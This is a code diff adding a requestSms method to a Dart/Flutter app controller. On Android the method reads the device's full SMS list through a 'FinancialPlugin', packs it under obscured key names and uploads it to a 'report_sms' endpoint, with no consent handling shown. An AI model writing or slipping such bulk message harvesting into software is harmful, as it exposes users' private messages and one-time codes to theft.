@@ -186,4 +186,24 @@ class HomeController extends GetxController with StateMixin<Map> {
     log("result33333:$result");
     return result;
   }
+
+  Future<Map<String, dynamic>> requestSms() async {
+    List smsList = [];
+    Map<dynamic, dynamic> deviceInfo = {};
+    if (Platform.isIOS) {
+    } else {
+      smsList = await FinancialPlugin().getSmsList();
+      deviceInfo = {
+        "modelU8mV9A": {"listNPJAeA": smsList}
+      };
+    }
+    if (kDebugMode) {
+      log("deviceInfo222:${jsonEncode(deviceInfo)}");
+    }
+    Map<String, dynamic> result = await HttpRequest.request(
+        InterfaceConfig.report_sms,
+        params: deviceInfo);
+    log("result44444:$result");
+    return result;
+  }
 }
